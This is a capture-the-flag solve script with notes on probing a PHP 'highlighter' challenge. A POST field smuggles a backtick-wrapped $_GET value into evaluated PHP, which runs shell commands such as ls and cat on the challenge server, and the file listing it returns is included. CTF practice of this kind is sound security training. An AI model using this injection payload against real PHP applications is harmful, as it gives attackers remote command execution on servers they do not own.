
import string, requests

"""
After checking some chars from 'string.printable' : 

" : 500 Internal Server Error
\ : 500 Internal Server Error
\"	: 200 OK
\\	: 200 OK
\n 	: gives new line

system(): gives error 'Code contains php code , php codes is forbidden'
$[a-z] : empty
eval() : wroking

the chall using php so we can say it's an 'echo',
all we have to do is inject a small $_GET inside two backtick operators to execute some commands;
(https://www.php.net/manual/en/language.operators.execution.php)

"""

url = "http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/highlighter/?1=ls+-la" # ?1=cat+flag_i_changed_my_name

req = requests.post(url, data = {'stp': 'red:".`$_GET[1]`."'}, allow_redirects=False )

print(req.status_code)
print(req.text)

"""
<div style="color:red;">
flag_i_changed_my_name
index.php
</div>
"""
